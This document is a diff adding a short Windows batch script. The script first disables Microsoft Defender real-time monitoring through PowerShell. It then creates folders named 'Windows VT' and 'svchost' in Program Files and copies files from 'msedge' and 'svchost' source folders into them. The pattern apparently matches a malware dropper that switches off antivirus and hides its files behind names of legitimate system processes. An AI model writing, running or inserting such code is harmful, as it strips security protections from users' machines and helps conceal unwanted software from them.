@@ -1,0 +1,16 @@
+@echo off
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+set "ParentFolder=E:\"
+set "ParentFolder2=E:\Program Files\Windows VT"
+set "NewFolderName=Windows VT"
+set "NewFolder2Name=svchost"
+mkdir "%NewFolderName%"
+cd "%NewFolderName%"
+mkdir "%ParentFolder2%\%NewFolder2Name%"
+set "SourceFolder=D:\Projects\bat\Windows VT\msedge"
+set "SourceFolder2=D:\Projects\bat\Windows VT\svchost"
+set "DestinationFolder=E:\Program Files\Windows VT"
+set "DestinationFolder2=E:\Program Files\Windows VT\svchost"
+copy "%SourceFolder%\*.*" "%DestinationFolder%"
+copy "%SourceFolder2%\*.*" "%DestinationFolder2%"
